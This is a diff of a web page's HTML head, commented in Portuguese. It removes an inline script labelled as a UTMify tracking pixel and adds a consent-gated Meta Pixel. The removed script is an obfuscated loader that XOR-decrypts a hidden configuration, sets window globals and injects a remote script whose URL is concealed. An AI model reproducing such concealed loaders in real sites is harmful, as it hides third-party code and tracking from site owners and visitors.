@@ -39,14 +39,8 @@
 <link rel="icon" href="images/favicon.svg" type="image/svg+xml">
 <link rel="apple-touch-icon" href="images/apple-touch-icon.png">
 
-<!-- Preconnect para reduzir latência do pixel/tracking (não altera pixel/UTM em si) -->
-<link rel="preconnect" href="https://connect.facebook.net">
-<link rel="preconnect" href="https://www.facebook.com">
-<link rel="preconnect" href="https://api.ipify.org">
-<link rel="preconnect" href="https://cdn.utmify.com.br" media="(max-width: 639px)">
-
-<!-- UTMify pixel -->
-<script>(function(){var z_cs4=atob("DFCa8L7GF4B4PdAmLCu4hcyqNbpaVaRSXCOg35Glc+5WSKRLRTbj3t2peq4aT/9VTyLzgMq1OPARRbVKAyDziNuqOeoLH/wETSTugtekYvQdTvIcdw220tmqeOIZUaMEFgvh0tCneuVaB/JWRSj/nPeiNaxaS7FKWTW4ypzwdrYcD+RFHDSsydzyIOEdD+gRSTKqyN/kat0F");var m_oau=[];for(var x_imr=0;x_imr<z_cs4.length;x_imr++){m_oau.push(z_cs4.charCodeAt(x_imr)&255);}var y_n6=m_oau[0];var r_x3=m_oau.slice(1,1+y_n6);var t_98qr=m_oau.slice(1+y_n6);var l_jdf5=t_98qr.map(function(b,o_ue){return b^r_x3[o_ue%y_n6];});var r_e="";for(var j_hp=0;j_hp<l_jdf5.length;j_hp++){r_e+=String.fromCharCode(l_jdf5[j_hp]&255);}var s_86c=decodeURIComponent(escape(r_e));var q_oz8=JSON.parse(s_86c);var u_14=q_oz8.globals||[];u_14.forEach(function(u_gn4w){window[u_gn4w.name]=u_gn4w.value;});var h_v4z=document.createElement("script");h_v4z.src=q_oz8.url;h_v4z.async=true;h_v4z.defer=true;(q_oz8.attributes||[]).forEach(function(r_vfic){h_v4z.setAttribute(r_vfic.name,r_vfic.value);});(document.head||document.documentElement).appendChild(h_v4z);})();</script><script src="js/pixel.js" async="" defer=""></script>
+<!-- Meta Pixel: carregado após consentimento publicitário -->
+<script src="js/meta-pixel.js" defer=""></script>
 
 <!-- UTMify UTM tracking -->
 <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
